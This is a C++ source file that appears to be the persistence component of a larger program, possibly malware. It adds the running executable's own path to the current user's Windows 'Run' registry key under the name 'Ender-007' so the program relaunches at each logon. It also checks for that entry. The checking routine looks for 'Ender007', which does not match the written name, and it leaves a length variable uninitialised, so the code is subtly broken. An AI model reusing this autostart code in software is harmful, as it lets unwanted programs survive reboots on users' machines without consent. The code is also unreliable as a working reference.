#include "persistence.h"

Registry::Registry()
{
	ValueofKey = new TCHAR[1000];
	RegStr = new TCHAR[1000];
	FileName = new TCHAR[1000];
	GetModuleFileName(NULL, FileName, 1000);
	StringCchCopy(RegStr, 1000, L"\"");
	StringCchCat(RegStr, 1000, FileName);
	StringCchCat(RegStr, 1000, L"\"");
}

Registry::~Registry()
{
	delete[] ValueofKey;
	delete[] FileName;
	delete[] RegStr;
}


bool Registry::SetRegKey()
{
	if (RegCreateKeyEx(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&key,
		NULL
	) != ERROR_SUCCESS)
	{
		return false;
	}

	if (RegSetValueEx(
		key,
		L"Ender-007",
		NULL,
		REG_SZ,
		(LPBYTE)RegStr,
		(lstrlen(RegStr) * 2) + 1
	) != ERROR_SUCCESS)
	{
		RegCloseKey(key);
		return false;
	}
	RegCloseKey(key);
	return true;
}

bool Registry::CheckRegKey() {
	if (RegOpenKeyEx(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_ALL_ACCESS,
		&key
	) != ERROR_SUCCESS)
	{
		return false;
	}

	if (RegQueryInfoKey(
		key,
		NULL, NULL, NULL, NULL, NULL, NULL, &TotalKeys, NULL, NULL, NULL, NULL
	) != ERROR_SUCCESS)
	{
		RegCloseKey(key);
		return false;
	}

	for (int i = 0; i < TotalKeys; i++)
	{
		if (RegEnumValue(
			key,
			i,
			ValueofKey,
			&lenValueKey, NULL, NULL, NULL, NULL
		) != ERROR_SUCCESS)
		{
			RegCloseKey(key);
			return false;
		}
		if (lstrcmp(ValueofKey, L"Ender007") == 0)
		{
			RegCloseKey(key);
			return true;
		}
	}
	RegCloseKey(key);
	return false;
}